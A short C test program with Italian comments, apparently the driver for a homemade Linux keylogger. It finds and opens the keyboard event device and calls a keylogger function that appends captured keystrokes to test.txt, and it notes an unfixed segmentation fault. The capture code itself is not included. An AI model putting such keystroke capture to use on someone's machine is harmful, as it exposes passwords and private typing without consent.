/*
    Compilazione, switch "-g" per debuggare con gdb! :
        gcc -g test_keylogger.c Keylogger/find_keyboard_event_file.c Keylogger/keylogger.c
*/

// Da fixare, va in segmentation fault!! Molto probabilmente nella riga 144 di keylogger.c per strcat((char *) keycodes[event.code], " "). Provare a toglierlo

#include <stdio.h>
#include "Keylogger/find_keyboard_event_file.h"
#include "Keylogger/keylogger.h"

int main(){

    printf("\n\n\n\n[+] Test find keyboard event file...");

    int writeout = open("test.txt", O_WRONLY|O_APPEND|O_CREAT, S_IROTH);
    char *keyboard_event_file = get_keyboard_event_file();
    
    printf("\n[+] keyboard_event_file = %s\n\n", keyboard_event_file);
    int keyboard = open(keyboard_event_file, O_RDONLY);
    printf("keyboard == %d", keyboard);
    if(writeout < 0x0){
        printf("error file");
        return 0x1;
    }

    if(keyboard < 0x0){
        printf("error keyboard");
        return 0x1;
    }

    // ???  NOn so a cosa servono, ma se usati si riesce a vedere i printf dentro keylogger
    //freopen("/dev/null", "w", stdout);
    //freopen("/dev/null", "w", stderr);
    printf("\nbefore\n");
    keylogger(keyboard, writeout);
    printf("\nafter\n");
    close(keyboard);
    close(writeout);
    free(keyboard_event_file);

    return 0x1;
}